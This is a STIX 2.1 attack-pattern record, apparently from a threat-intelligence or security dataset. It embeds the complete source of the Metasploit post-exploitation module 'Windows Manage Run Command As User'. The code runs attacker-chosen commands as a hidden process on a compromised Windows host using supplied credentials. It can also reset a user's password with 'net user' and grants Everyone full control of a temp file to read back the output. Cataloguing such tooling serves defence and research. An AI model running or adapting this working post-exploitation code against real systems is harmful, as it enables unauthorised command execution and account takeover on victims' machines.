{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cae98d22-e928-4d26-85d8-848a6de4682e",
    "created": "2024-08-14T16:33:04.993684Z",
    "modified": "2024-08-14T16:33:04.993688Z",
    "name": "Windows Manage Run Command As User",
    "description": " This module will login with the specified username/password and execute the supplied command as a hidden process. Output is not returned by default, by setting CMDOUT to true output will be redirected to a temp file and read back in to display. By setting advanced option SETPASS to true, it will reset the users password and then execute the command.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/run_as.rb",
            "external_id": "run_as.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Runas\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Run Command As User',\n        'Description' => %q{\n          This module will login with the specified username/password and execute the\n          supplied command as a hidden process. Output is not returned by default, by setting\n          CMDOUT to true output will be redirected to a temp file and read back in to\n          display. By setting advanced option SETPASS to true, it will reset the users\n          password and then execute the command.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Kx499'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_config_getprivs\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DOMAIN', [true, 'Domain to login with' ]),\n        OptString.new('USER', [true, 'Username to login with' ]),\n        OptString.new('PASSWORD', [true, 'Password to login with' ]),\n        OptString.new('CMD', [true, 'Command to execute' ]),\n        OptBool.new('CMDOUT', [true, 'Retrieve command output', false])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SETPASS', [true, 'Reset password', false])\n      ]\n    )\n  end\n\n  # Check if sufficient privileges are present for certain actions and run getprivs for system\n  # If you elevated privs to system,the SeAssignPrimaryTokenPrivilege will not be assigned. You\n  # need to migrate to a process that is running as\n  # system. If you don't have privs, this exits script.\n  def priv_check\n    if is_system?\n      privs = session.sys.config.getprivs\n      return privs.include?('SeAssignPrimaryTokenPrivilege') && privs.include?('SeIncreaseQuotaPrivilege')\n    end\n\n    false\n  end\n\n  def reset_pass(user, password)\n    tmpout = cmd_exec(\"cmd.exe /c net user #{user} #{password}\")\n    return tmpout.include?('successfully')\n  rescue StandardError\n    return false\n  end\n\n  def touch(path)\n    write_file(path, '')\n    cmd_exec(\"icacls #{path} /grant Everyone:(F)\")\n  end\n\n  def run\n    # Make sure we meet the requirements before running the script, note no need to return\n    # unless error\n    return unless session.type == 'meterpreter'\n\n    pi = nil\n    # check/set vars\n    setpass = datastore['SETPASS']\n    cmdout = datastore['CMDOUT']\n    user = datastore['USER'] || nil\n    password = datastore['PASSWORD'] || nil\n    cmd = datastore['CMD'] || nil\n    domain = datastore['DOMAIN']\n\n    if setpass\n      print_status('Setting user password')\n      fail_with(Failure::Unknown, 'Error resetting password') unless reset_pass(user, password)\n    end\n\n    # If command output is requested, then create output file and set open permissions\n    if cmdout\n      system_temp = get_env('WINDIR') << '\\\\Temp'\n      outpath = \"#{system_temp}\\\\#{Rex::Text.rand_text_alpha(8)}.txt\"\n      touch(outpath)\n      cmdstr = \"cmd.exe /c #{cmd} > #{outpath}\"\n    else\n      cmdstr = \"cmd.exe /c #{cmd}\"\n    end\n\n    # Check privs and execute the correct commands\n    # if user use createprocesswithlogon, if system logonuser and createprocessasuser\n    # execute command and get output with a poor mans pipe\n    if priv_check\n      print_status('Executing CreateProcessAsUserA...we are SYSTEM')\n      pi = create_process_as_user(domain, user, password, nil, cmdstr)\n      if pi\n        session.railgun.kernel32.CloseHandle(pi[:process_handle])\n        session.railgun.kernel32.CloseHandle(pi[:thread_handle])\n      end\n    else\n      print_status('Executing CreateProcessWithLogonW...')\n      pi = create_process_with_logon(domain, user, password, nil, cmdstr)\n    end\n\n    # Only process file if the process creation was successful, delete when done, give us info\n    # about process\n    if pi\n      tmpout = read_file(outpath) if cmdout\n\n      print_status(\"Command Run: #{cmdstr}\")\n      vprint_status(\"Process Handle: #{pi[:process_handle]}\")\n      vprint_status(\"Thread Handle: #{pi[:thread_handle]}\")\n      vprint_status(\"Process Id: #{pi[:process_id]}\")\n      vprint_status(\"Thread Id: #{pi[:thread_id]}\")\n      print_status(\"Command output:\\r\\n#{tmpout}\") if cmdout\n    end\n\n    if cmdout\n      print_status(\"Removing temp file #{outpath}\")\n      rm_f(outpath)\n    end\n  end\nend\n"
}